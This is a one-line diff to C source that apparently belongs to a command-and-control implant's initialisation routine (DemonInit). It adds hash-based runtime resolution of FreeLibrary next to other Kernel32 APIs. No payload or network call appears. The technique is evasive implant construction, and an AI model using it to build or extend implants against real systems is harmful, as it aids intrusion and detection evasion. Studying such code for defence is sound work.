@@ -348,6 +348,7 @@ VOID DemonInit( VOID )
         Instance.Win32.DisconnectNamedPipe                 = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_DisconnectNamedPipe );
         Instance.Win32.WriteFile                           = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_WriteFile );
         Instance.Win32.ConnectNamedPipe                    = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_ConnectNamedPipe );
+        Instance.Win32.FreeLibrary                         = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_FreeLibrary );
         Instance.Win32.GetCurrentDirectoryW                = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetCurrentDirectoryW );
         Instance.Win32.GetFileAttributesW                  = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_GetFileAttributesW );
         Instance.Win32.FindFirstFileW                      = LdrFunctionAddr( Instance.Modules.Kernel32, FuncHash_FindFirstFileW );
